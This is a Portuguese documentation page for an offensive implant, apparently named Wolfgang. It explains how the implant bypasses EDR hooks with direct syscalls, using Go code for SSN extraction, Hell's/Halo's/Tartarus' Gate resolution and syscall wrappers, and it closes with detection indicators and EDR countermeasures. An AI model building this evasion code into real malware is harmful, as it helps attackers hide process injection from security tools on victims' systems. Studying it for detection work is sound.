    Direct Syscalls¶

    O que é¶

    Direct syscalls é a técnica de invocar NT syscalls diretamente, sem passar pelas funções exportadas de ntdll.dll. EDRs instalam hooks (inline hooks, trampolines) no início das funções de ntdll.dll em memória para interceptar chamadas como NtAllocateVirtualMemory, NtWriteVirtualMemory e NtCreateThreadEx. Com direct syscalls, o implant resolve o Syscall Service Number (SSN) e executa a instrução syscall diretamente em assembly, bypassando completamente os hooks.

    O Wolfgang implementa resolução de SSN via leitura do ntdll.dll em disco (limpo, sem hooks) e suporta Hell's Gate, Halo's Gate e Tartarus' Gate como algoritmos de resolução resiliente.

    Por que funciona¶

    Anatomia de um hook de EDR¶

    Quando um EDR instala um hook em NtAllocateVirtualMemory, ele modifica os primeiros bytes da função em memória:

    Função original (ntdll em disco):          Função hookada (ntdll em memória):
  4C 8B D1       mov r10, rcx               E9 XX XX XX XX    jmp EDR_hook
  B8 18 00 00 00 mov eax, 0x18 (SSN)        90                nop
  0F 05          syscall                     90                nop
  C3             ret                         ...
                                             (EDR analisa parâmetros)
                                             (EDR decide: allow/block)
                                             (EDR executa o syscall original)

    O hook redireciona a execução para código do EDR, que inspeciona os parâmetros e decide se permite a operação. Direct syscalls evitam esse redirecionamento inteiramente.

    Por que ler ntdll do disco¶

    A cópia de ntdll.dll em disco não possui hooks -- EDRs só modificam a cópia já mapeada na memória do processo. Lendo do disco, obtemos os SSNs corretos sem interferência.

    Implementação no Wolfgang¶

    Resolução de SSNs¶

    const ntdllPath = `C:\Windows\System32\ntdll.dll`

func (st *SyscallTable) Resolve() error {
    // Lê ntdll do disco (sem hooks)
    data, _ := st.readFile(st.dllPath)

    // Parse das exports via PE parser
    pe, _ := peparser.Parse(data)

    required := []string{
        "NtCreateThreadEx",
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
    }

    for _, name := range required {
        ssn, _ := st.resolve(pe, data, name)
        st.resolved[name] = ssn
    }
    return nil
}

    Extração do SSN¶

    O SSN é extraído do padrão de bytes da função Nt*:

    // Windows Nt* functions start with:
//   4C 8B D1        mov r10, rcx
//   B8 XX XX 00 00  mov eax, <SSN>
func extractSSN(data []byte, offset uint32) (uint16, error) {
    searchLen := uint32(32)
    for i := offset; i < offset+searchLen-4; i++ {
        if data[i] == 0xB8 && i+5 <= uint32(len(data)) {
            ssn := binary.LittleEndian.Uint32(data[i+1 : i+5])
            if ssn < 0x10000 {
                return uint16(ssn), nil
            }
        }
    }
    return 0, fmt.Errorf("SSN pattern not found")
}

    O opcode 0xB8 é mov eax, imm32 -- os 4 bytes seguintes contêm o SSN.

    Resolução Resiliente: Hell's/Halo's/Tartarus' Gate¶

    Quando a extração direta falha (ntdll em disco corrompido ou obfuscado), o Wolfgang usa neighbor resolution:

    func (st *SyscallTable) resolveWithHaloGate(pe *peparser.PE, data []byte,
    name string, maxDepth int) (uint16, error) {

    // 1. Coleta todas as exports Nt*/Zw* e ordena por RVA
    allExports, _ := pe.ParseExports()
    var ntExports []peparser.Export
    for _, e := range allExports {
        if isNtFunction(e.Name) {
            ntExports = append(ntExports, e)
        }
    }
    sort.Slice(ntExports, func(i, j int) bool {
        return ntExports[i].RVA < ntExports[j].RVA
    })

    // 2. Localiza o índice da função alvo
    targetIdx := findIndex(ntExports, name)

    // 3. Hell's Gate: tenta extração direta
    if ssn, err := extractSSN(data, targetOffset); err == nil {
        return ssn, nil
    }

    // 4. Halo's Gate (dist=1) -> Tartarus' Gate (dist=2..maxDepth)
    for dist := 1; dist <= maxDepth; dist++ {
        // Tenta vizinho anterior
        if idx := targetIdx - dist; idx >= 0 {
            if neighborSSN, err := extractSSN(data, neighborOffset); err == nil {
                ntDelta := countNtFunctionsBetween(ntExports, idx, targetIdx)
                return neighborSSN + uint16(ntDelta), nil
            }
        }
        // Tenta vizinho posterior
        if idx := targetIdx + dist; idx < len(ntExports) {
            if neighborSSN, err := extractSSN(data, neighborOffset); err == nil {
                ntDelta := countNtFunctionsBetween(ntExports, targetIdx, idx)
                return neighborSSN - uint16(ntDelta), nil
            }
        }
    }

    return 0, fmt.Errorf("all neighbors hooked within depth %d", maxDepth)
}

    A lógica de resolução:

    • Hell's Gate: Extração direta do SSN dos bytes da função
    • Halo's Gate: Se o alvo está hookado, usa o vizinho imediato (dist=1) e calcula o SSN pela diferença ordinal
    • Tartarus' Gate: Se vizinhos próximos também estão hookados, expande a busca até maxDepth (default: 5)

    Invocação via Assembly¶

    A chamada real do syscall é feita via assembly (syscall_asm_windows_amd64.s):

    // doSyscall executa um NT syscall direto com o SSN e até 4 argumentos.
func doSyscall(ssn uintptr, a1, a2, a3, a4 uintptr) uintptr

    Wrappers tipados expõem as operações comuns:

    func (st *SyscallTable) NtAllocateVirtualMemory(
    processHandle, baseAddr, zeroBits, regionSize uintptr) uintptr {
    ssn, _ := st.Get("NtAllocateVirtualMemory")
    return doSyscall(uintptr(ssn), processHandle, baseAddr, zeroBits, regionSize)
}

    Detecção¶

    IOC Descrição
    Leitura de ntdll.dll do disco ReadFile em C:\Windows\System32\ntdll.dll
    syscall instruction fora de ntdll.dll Code que executa syscall em região non-ntdll
    Ausência de chamadas para ntdll exports Processo que não chama funções hookadas
    Thread com return address fora de ntdll Stack walking mostra syscall de região inesperada

    Contramedidas de EDRs¶

    • Kernel callbacks: ObRegisterCallbacks, PsSetCreateThreadNotifyRoutine operam no kernel, independente de hooks em userland
    • Stack walking: Alguns EDRs verificam que o return address de um syscall aponta para dentro de ntdll.dll (call stack spoofing é necessário para evitar)
    • InstrumentationCallback: Windows 10+ permite registrar callbacks para monitorar transições user->kernel
    • Minifilter drivers: Monitoram file I/O, podem detectar leitura de ntdll

    Limitações¶

    O direct syscall do Wolfgang não implementa call stack spoofing. EDRs que verificam a call stack podem detectar que a instrução syscall originou de uma região de memória que não é ntdll.dll.
